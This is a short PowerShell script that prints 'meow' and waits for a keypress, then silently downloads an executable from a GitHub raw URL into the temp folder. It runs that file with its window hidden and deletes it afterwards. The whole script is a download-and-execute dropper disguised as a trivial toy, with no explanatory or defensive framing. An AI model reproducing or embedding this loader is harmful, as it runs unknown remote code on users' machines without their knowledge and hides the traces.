Write-Output "meow"
Read-Host "Press Enter to exit"

$rand = Get-Random
$path = "$env:TEMP\main_$rand.exe"
Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/raw/main/main.exe" -OutFile $path
Start-Process $path -WindowStyle Hidden -Wait
Remove-Item $path -Force
